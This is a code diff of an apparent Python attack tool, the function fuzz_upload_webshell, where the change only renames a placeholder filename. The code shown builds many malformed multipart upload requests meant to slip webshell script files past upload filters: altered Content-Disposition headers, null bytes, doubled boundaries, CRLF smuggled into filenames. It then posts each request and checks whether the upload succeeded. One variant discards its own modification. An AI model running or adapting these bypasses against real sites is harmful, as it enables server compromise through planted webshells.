     # 修改Content-Disposition中的name部分形如nAme="file",并修改后缀为webshell后缀
     if not use_packet_file:
-        new_line = 'Content-Disposition: form-data; nAme="%s"; filename="test.%s"' % (
+        new_line = 'Content-Disposition: form-data; nAme="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
     else:
-        new_line = b'Content-Disposition: form-data; nAme="%s"; filename="test.%s"' % (
+        new_line = b'Content-Disposition: form-data; nAme="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
     packet = work_packet.replace(origin_line, new_line)
     print('修改Content-Disposition中的name部分形如nAme="%s",并修改后缀为webshell后缀' %
           form_file_param_name.decode('utf8'))
@@ -702,12 +702,12 @@ def fuzz_upload_webshell():
 
     # 修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'Content-Disposition\n: form-data; name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition\n: form-data; name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'Content-Disposition\n: form-data; name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition\n: form-data; name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print("修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀")
@@ -716,12 +716,12 @@ def fuzz_upload_webshell():
 
     # 删除Content-Disposition字段里的空格,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'Content-Disposition:form-data; name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition:form-data; name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'Content-Disposition:form-data; name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition:form-data; name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print("删除Content-Disposition字段里的空格,并修改后缀为webshell后缀")
@@ -730,12 +730,12 @@ def fuzz_upload_webshell():
 
     # 去掉content-disposition的form-data字段,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'Content-Disposition: name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'Content-Disposition: name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print("去掉content-disposition的form-data字段,并修改后缀为webshell后缀")
@@ -744,12 +744,12 @@ def fuzz_upload_webshell():
 
     # 删掉"content-disposition: form-data;"并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = ' name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = ' name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b' name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b' name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print('删掉"content-disposition: form-data;"并修改后缀为webshell后缀')
@@ -758,12 +758,12 @@ def fuzz_upload_webshell():
 
     # 修改为"content-disposition\00:",并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'Content-Disposition\x00: name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition\x00: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'Content-Disposition\x00: name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition\x00: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print('修改为"content-disposition\00:",并修改后缀为webshell后缀')
@@ -772,12 +772,12 @@ def fuzz_upload_webshell():
 
     # {char}+content-disposition,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'aContent-Disposition: name="%s"; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'aContent-Disposition: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'aContent-Disposition: name="%s"; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'aContent-Disposition: name="%s"; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print('{char}+content-disposition,并修改后缀为webshell后缀')
@@ -789,13 +789,13 @@ def fuzz_upload_webshell():
         origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
         new_line = 'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                         script_suffix, packet)
     else:
         origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
         new_line = b'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                         script_suffix, packet)
     print('head头的content-type: tab,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
@@ -806,13 +806,13 @@ def fuzz_upload_webshell():
         origin_line = 'Content-Type: multipart/form-data;'
         new_line = 'Content-Type: multipart/form-DATA;'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                         script_suffix, packet)
     else:
         origin_line = b'Content-Type: multipart/form-data;'
         new_line = b'Content-Type: multipart/form-DATA;'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                         script_suffix, packet)
     print('head头的content-type: multipart/form-DATA,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
@@ -823,13 +823,13 @@ def fuzz_upload_webshell():
         origin_line = 'Content-Type: multipart/form-data; '
         new_line = 'Content-Type: multipart/form-data;\n'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                         script_suffix, packet)
     else:
         origin_line = b'Content-Type: multipart/form-data; '
         new_line = b'Content-Type: multipart/form-data;\n'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                         script_suffix, packet)
     print('head头的Content-Type: multipart/form-data;\n,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
@@ -840,13 +840,13 @@ def fuzz_upload_webshell():
         origin_line = 'Content-Type: multipart/form-data;'
         new_line = 'Content-Type : multipart/form-data;'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                         script_suffix, packet)
     else:
         origin_line = b'Content-Type: multipart/form-data;'
         new_line = b'Content-Type : multipart/form-data;'
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                         script_suffix, packet)
     print('head头content-type空格:,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
@@ -854,12 +854,12 @@ def fuzz_upload_webshell():
 
     # form-data字段与name字段交换位置,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = 'name="%s"; Content-Disposition: form-data; filename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = 'name="%s"; Content-Disposition: form-data; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-        new_line = b'name="%s"; Content-Disposition: form-data; filename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
+        new_line = b'name="%s"; Content-Disposition: form-data; filename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print('form-data字段与name字段交换位置,并修改后缀为webshell后缀')
@@ -868,20 +868,20 @@ def fuzz_upload_webshell():
 
     # 双boundary,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        origin_line = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, form_file_param_name)
-        new_line = '--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        new_line = '--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, boundary, form_file_param_name)
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                         script_suffix, packet)
     else:
-        origin_line = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        origin_line = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, form_file_param_name)
-        new_line = b'--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        new_line = b'--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, boundary, form_file_param_name)
         packet = work_packet.replace(origin_line, new_line)
-        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                         script_suffix, packet)
     print('双boundary,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
@@ -890,26 +890,26 @@ def fuzz_upload_webshell():
     # 修改成形如'Content-Disposition: form-data; name="image";
     # filename="085733uykwusqcs8vw8wky.png\r\nC.php"'
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-        new_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-        new_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
-    print('修改成形如Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' %
+    print('修改成形如Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' %
           (form_file_param_name, script_suffix))
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改filename为file\nname,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'filename="test.jpg"'
-        new_line = 'file\nname="test.%s"' % script_suffix
+        origin_line = 'filename="t3st.jpg"'
+        new_line = 'file\nname="t3st.%s"' % script_suffix
     else:
-        origin_line = b'filename="test.jpg"'
-        new_line = b'file\nname="test.%s"' % script_suffix
+        origin_line = b'filename="t3st.jpg"'
+        new_line = b'file\nname="t3st.%s"' % script_suffix
     work_packet.replace(origin_line, new_line)
     print('修改filename为file\nname')
     rsp = post_multipart_form_data(packet)
@@ -917,12 +917,12 @@ def fuzz_upload_webshell():
 
     # filename在content-type下面,并修改后缀为webshell后缀
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-        new_line = 'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="test.%s"' % (
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = 'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-        new_line = b'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="test.%s"' % (
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = b'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="t3st.%s"' % (
             form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
     print('filename在content-type下面,并修改后缀为webshell后缀')
@@ -931,14 +931,14 @@ def fuzz_upload_webshell():
 
     # boundary和content-disposition中间插入换行
     if not use_packet_file:
-        origin_string = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        origin_string = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, form_file_param_name)
-        new_string = '--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (
+        new_string = '--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"' % (
             boundary, form_file_param_name, script_suffix)
     else:
-        origin_string = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+        origin_string = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
             boundary, form_file_param_name)
-        new_string = b'--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (
+        new_string = b'--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"' % (
             boundary, form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_string, new_string)
     print("boundary和content-disposition中间插入换行,并修改后缀为webshell后缀")
@@ -1093,7 +1093,7 @@ Content-Type: multipart/form-data; boundary=%s''' % (url, cookie, boundary)
         data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
         data.append(value + "\r\n")
     data.append('--%s\r\n' % boundary)
-    data.append('Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\n' %
+    data.append('Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\n' %
                 (form_file_param_name))
     data.append('Content-Type: image/jpeg\r\n\r\n')
     data.append(jpg_file_content + "\r\n")
